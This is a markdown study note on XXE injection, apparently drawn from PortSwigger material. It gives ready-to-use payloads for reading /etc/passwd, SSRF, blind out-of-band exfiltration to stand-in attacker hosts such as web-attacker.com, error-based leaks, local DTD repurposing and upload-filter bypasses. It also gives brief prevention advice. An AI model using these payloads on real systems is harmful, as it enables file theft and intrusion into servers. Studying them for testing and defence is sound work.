# XML external entity (XXE) injection :syringe:

Uses XML data processing by a server to execute attacks against a server.  Can allow an attacker to:

- Read files on the server;
- Compromise the server; or
- Execute SSRF attacks.

Attacks occur when applications use XML to transmit data and do not disable potentially dangerous processing of XML entities.

:bulb: This type was more prevelant before JSON became the dominant data transfer format, but it is still sometimes exploitable.

## XML refresher

- `XML entities`: represent special characters in XML documents such as `&amp;`, `&gt;` and `&lt;`.
- `Document type definition (DTD)`: defines the structure of an XML document.  DTD is defined using a `DOCTYPE` tag.
- `XML custom entity`: define a custom entity in a DTD: `<!DOCTYPE foo [ <!ENTITY bar "bambaz" > ]>` which will cause `&bar;` to be replaced with the value `bambaz`.
- `XML external entity`: define an external entity in a DTD using the `SYSTEM` keyword.  They can be referenced from a local file or URL: 
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

Most XXE attacks are caused by XML external entities.

## XXE attacks

- `Retrieve file contents`: 
```xml
# Return the contents of `/etc/passwd`
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
```
- `Perform SSRF attack`: 
```xml
# Return contents of `http://internal-website.com`
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://internal-website.com" > ]>
```
- `Blind XXE to exfiltrate data`: 
```xml
# Cause the contents of `/etc/passwd` to be send to http://evil-corp.com
<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd" >
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil-corp.com/?x=%file;'>"> %eval; %exfiltrate; ]>`
```
- `Blind XXE to retrieve data via error messages`: attacker triggers an XML parsing error that leaks sensitive data.

:bulb: When testing for XXE vulnerabilities, you will often need to test each node of the XML document to see if it is vulnerable.

### Retrieve file contents

Attacker must introduce or edit the DOCTYPE.  For example, an XML request that gets stock levels:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>

# Alter to include a doctype that references a local file with a new `&xxe;` entity
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### Perform SSRF attack

Induce the application to make a request and return the resonse from an internal system:

```xml
# Reponse will include response from http://internal.vulnerable-website.com/ if output is displayed to the user
# Otherwise, this is a blind XXE attack
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### XXE via file upload

If an application allows XML to be uploaded.  This can include SVG files, which are XML.  For example, an SVG file that displays a message:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="15" fill="red">&xxe;</text>
</svg>
```

It may also be possible to cause the server to accept an SVG file even if it only accepts PNG or JGP image types by changing the file extension:
```sh
# null byte and semicolon termination
malicious.svg%00.jpg
malicious.svg;.jpg`
```

### XXE via modified content type

Although an application may expect to receive request payloads in a specific type, it may be tolerant of XML payloads:

```http
# Expected format
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

# Tolerates XML instead, at which point, XXE attacks can be attempted
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

### Blind XXE

Detect blind XXE by:

- using out-of-band testing; or
- triggering XML parsing errors.

#### Out-of-band testing (OAST)

The following will make a very specific request to a server controlled by the attacker which will be seen in the logs:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

It may be possible to bypass XML parsing hardening using parameter entities as well:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

#### Exfiltrating data using blind XXE

Attacker defines a malicious DTD hosted at `http://web-attacker.com/malicious.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

They can then submit the following XML payload to a vulnerable application:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe; ]>
```

:bulb: this type of attack may be blocked by responses that contain newline characters.  Sometimes this can be bypassed using the FTP protocol rather than HTTP.

#### Retrieving data via XML parsing errors

Attacker defines a malicious DTD hosted at `http://web-attacker.com/malicious.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Submitting the following to a vulnerable application will cause an XML error that leaks the contents of `/etc/passwd`:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe; ]>
```

#### Reporposing a local DTD

If external entity resolution is disabled, you may be able to redefine a custom entity within a local DTD on the target system.

1. Find a suitable local DTD file by searching for `*.dtd` files:

```xml
# This will issue an error if the local DTD does not exist
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
%local_dtd;
]>
```

2. Redefine a custom entity within the local DTD:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

## Finding XXE injection vulnerabilities

- `Requests contain XML data`: these are obvious vectors for XXE attacks.
- `XInclude attacks`: occur when the application includes your request in another XML document.  Since you do not control the entire document, a new `DOCTYPE` cannot be added.  However, `XInclude` still allows for XXE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
- `File retrieval`: test for well known OS file retrieval such as `/etc/passwd` or `/etc/hosts`.
- `Blind XXE to trigger SSRF`: send requests to systems you control and watch for requests in the logs.


## Prevent

- Disable as many XML processing features as possible.
- Usually disabling external entity resolution and `XInclude` is enough.

## Tools

## References

- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/blind
- https://portswigger.net/web-security/xxe/xml-entities